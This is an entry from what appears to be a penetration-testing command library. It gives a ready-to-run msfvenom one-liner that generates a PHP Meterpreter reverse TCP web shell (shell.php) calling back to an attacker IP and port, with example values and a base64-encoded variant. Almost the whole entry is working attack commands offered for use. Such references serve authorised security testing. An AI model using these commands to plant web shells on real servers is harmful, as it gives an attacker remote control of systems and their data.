---
id: d0736570-1dd0-4d89-8abd-4be45ae1c5b2
name: generate-php-meterpreter-payload
type: command
executor: bash
data: >-
  msfvenom -p php/meterpreter_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f raw >
  shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php &&
  pbpaste >> shell.php
output: null
created_at: '2023-04-06T03:56:24.923879+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - PHP
  - Web
tags:
  - meterpreter
  - reverse-shell
  - php
  - web-shell
verified: true
validated: true
---

# Generate PHP Meterpreter Payload

## Command

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

## Description

Generates a PHP Meterpreter reverse TCP payload and formats it with opening PHP tags for web execution (macOS-specific clipboard ops).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p php/meterpreter_reverse_tcp | PHP Meterpreter payload | Built-in |
| -f raw | Raw PHP output | Built-in |
| > shell.php; ... | Generate, copy, prepend <?php, and paste | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### Advanced Usage

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f raw -e php/base64 > shell.php # Then format
```

## Expected Output

Formatted shell.php starting with <?php followed by eval(gzinflate...); size ~2 KB.

## Related

- [[commands/generate-java-jsp-reverse-shell-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
